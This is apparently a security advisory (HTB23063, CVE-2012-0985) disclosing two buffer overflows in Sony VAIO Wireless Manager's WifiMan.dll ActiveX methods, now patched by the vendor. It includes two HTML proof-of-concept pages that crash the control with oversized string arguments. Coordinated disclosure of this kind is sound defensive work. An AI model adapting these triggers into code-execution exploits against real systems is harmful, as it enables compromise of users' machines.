@@ -1,0 +1,96 @@
+Advisory ID: HTB23063
+Product: Wireless Manager Sony VAIO
+Vendor: Sony Computers
+Vulnerable Version(s): 4.0.0.0 and probably prior
+Tested Version: 4.0.0.0
+Vendor Notification: 7 December 2011 
+Vendor Patch: 20 January 2012 
+Public Disclosure: 30 May 2012 
+Vulnerability Type: Buffer Overflow
+CVE Reference: CVE-2012-0985
+Solution Status: Fixed by Vendor
+Risk Level: High 
+Credit: High-Tech Bridge SA Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge SA Security Research Lab has discovered 2 buffer overflow vulnerabilities in Wireless Manager Sony VAIO which can be exploited to execute arbitrary code on vulnerable system.
+
+
+1) Buffer Overflow in Wireless Manager Sony VAIO: CVE-2012-0985
+
+
+1.1 The method SetTmpProfileOption() in WifiMan.dll library does not properly check the length of string parameters.
+
+An attacker could craft a malicious HTML page to trigger the vulnerability and execute arbitrary code in the context of the affected user.
+
+The following PoC will crash the application:
+
+
+<HTML>
+<BODY>
+<object id=ctrl 
+classid="clsid:{92E7DDED-BBFE-4DDF-B717-074E3B602D1B}"></object>
+<SCRIPT>
+function Do_()
+{
+   arg1=1
+   arg2=String(8212, "X")
+   arg3="defaultV"
+   SetTmpProfileOption arg1 ,arg2 ,arg3
+}
+</SCRIPT>
+<input language=JavaScript onclick=Do_() type=button value="Sony_POC">
+</BODY>
+</HTML>
+
+
+
+1.2 The method ConnectToNetwork() in WifiMan.dll library does not properly check the length of string parameters.
+
+An attacker could craft a malicious HTML page to trigger the vulnerability and execute arbitrary code in the context of the affected user.
+
+The following PoC will crash the application:
+
+
+<HTML>
+<BODY>
+<object id=ctrl 
+classid="clsid:{92E7DDED-BBFE-4DDF-B717-074E3B602D1B}"></object>
+<SCRIPT>
+function Do_()
+{
+   arg1=1
+   arg2=String(6164, "X")
+   target.ConnectToNetwork arg1 ,arg2
+}
+</SCRIPT>
+<input language=JavaScript onclick=Do_() type=button value="Sony_POC">
+</BODY>
+</HTML>
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Sony has released a security update for the Affected Models that resolves this issue. Sony recommends that all customers who have Affected Models immediately install the latest version of the software by using VAIO Update.
+
+Note: If you are using the default VAIO Update settings the update will be installed automatically.
+
+More information and security update:
+http://esupport.sony.com/US/perl/support-info.pl?template_id=1&info_id=946
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23063 - https://www.htbridge.com/advisory/HTB23063 - Buffer Overflow in Wireless Manager Sony VAIO.
+[2] Wireless Manager Sony VAIO - http://www.sony.co.uk/hub/vaio-laptops - is a software to manage wireless connections that is installed by default on various series of Sony VAIO laptops.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
